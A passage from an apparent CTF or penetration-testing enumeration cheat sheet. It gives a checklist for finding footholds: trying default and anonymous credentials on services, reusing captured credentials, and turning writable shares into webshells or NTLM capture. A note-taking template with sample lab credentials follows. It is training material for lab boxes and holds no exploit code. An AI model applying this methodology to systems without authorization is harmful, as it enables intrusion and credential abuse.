2. **Is there a domain name?**  From TLS cert, SMB, LDAP, RDP NLA, HTTP redirects. Put in `/etc/hosts`. Vhost fuzz.
3. **Is there a version banner I haven't searchsploited?**  Every service banner → `searchsploit <product> <version>`.
4. **Have I tried anonymous / null / default on EVERY service?**  FTP anon, SMB null, MSSQL sa:blank, MySQL root:blank, Redis no-auth, MongoDB no-auth, SNMP public/private, RDP guest.
5. **Have I tried each cred I have on every other service?**  Reuse is the #1 win.
6. **Is there a writable share / NFS export / FTP / SMB / rsync / web upload?**  Write paths → webshells, NTLM capture, key drops.
7. **Have I really looked at the web app?**  Source HTML, JS files, robots.txt, sitemap.xml, comments, hidden forms, parameter fuzz on every endpoint.
8. **Did I run UDP?**  Don't skip it.

If all eight are "yes" and you still have no foothold — **re-read the nmap output**. Something is sitting in plain sight.

---

## Note-Taking Template

Per-box scratchpad. Fill as you go.

```
== Box: <name> ==
IP:          10.10.10.10
Hostname:    <add to /etc/hosts>
Domain:      <if AD>
OS guess:    <Linux/Windows version>

== Open ports ==
21/tcp    ftp        vsftpd 3.0.3          | anon: yes  | notes:
22/tcp    ssh        OpenSSH 8.2           |            | notes:
80/tcp    http       Apache 2.4.41         | cms: WP    | notes:
445/tcp   smb        Samba 4.x             | null: no   | notes:
...

== Findings ==
[ ] anon ftp — pulled 3 files, found cred admin:S3cret in config.bak
[ ] WP user 'editor' from /?author=2
[ ] SMB null lists IPC$, no useful shares
[ ] SSH cred reuse: admin:S3cret → user shell ✓

== Creds collected ==
admin : S3cret             (web, ssh)
editor: <unknown>

== TODO ==
[ ] vhost fuzz against http://10.10.10.10/
[ ] UDP scan still running
[ ] try MSSQL with admin:S3cret
```

Re-run this loop every time you get a new piece of info — new creds, new hostname, new internal IP. Enumeration never stops.
